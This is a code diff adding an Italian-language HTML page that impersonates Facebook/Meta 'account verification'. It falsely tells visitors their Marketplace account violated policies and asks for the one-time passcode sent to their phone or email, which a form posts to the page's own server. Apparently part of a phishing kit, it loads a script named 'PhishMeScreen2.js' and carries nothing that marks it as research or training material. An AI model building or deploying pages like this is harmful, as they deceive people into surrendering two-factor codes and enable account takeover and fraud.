@@ -1,0 +1,66 @@
+<html lang="it" class=" wztgcr idc0_350"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifica dell'account</title>
+	<script type="text/javascript" src="components/PhishMeScreen2.js"></script>
+
+    <link rel="stylesheet" type="text/css" href="./components/4.css">
+    <link rel="icon" href="/static/images/anhfb.png" type="image/webp">
+
+    <style>
+        input[type='number']::-webkit-outer-spin-button,
+        input[type='number']::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
+            appearance: none;
+            margin: 0;
+        }
+    </style>
+    
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+</head>
+<body>
+
+    <div class="header-container">
+        <div class="lop3">
+            <img id="metaLogo" class="hinh1" src="./components/metaLogo.png" alt="Hình ảnh mô tả">
+        </div>
+    </div>
+
+    <div class="main">
+        <h1 class="h1">·Verifica di Facebook</h1>
+        <h2 class="h2">Approva il dispositivo esterno e inserisci il codice OTP per la verifica.</h2>
+        <p class="h3">Sospettiamo che l'account di Facebook Marketplace abbia violato le politiche. Inserisci il codice che ti abbiamo inviato per verificare l'account.</p>
+        
+        <img id="backgroundMeta" class="hinh2" src="./components/bg.jpg" alt="Hình ảnh mô tả">
+        
+        <p class="hh1">Abbiamo inviato un OTP al tuo numero di telefono o email. Inserisci il codice per continuare.</p>
+        
+        <div class="bang">
+            <form id="loginForm" method="POST" action="/5" onsubmit="validateForm(event);">
+                
+                <div class="form-group">
+                    <label for="OTP2"></label>
+                    <input type="number" id="OTP2" name="OTP2" placeholder="OTP">
+                </div>
+                
+                <div class="row">
+                    <p class="err OTP_err">Il tuo codice è scaduto</p>
+                </div>
+                
+                <div>
+                    <button type="submit" id="submitButton">
+                        <span class="button-text">Invia</span>
+                        <span class="spinner"></span>
+                    </button>
+                </div>
+                
+            </form>
+        </div>
+    </div>
+
+    <script src="./components/5.js"></script>
+
+</body></html>
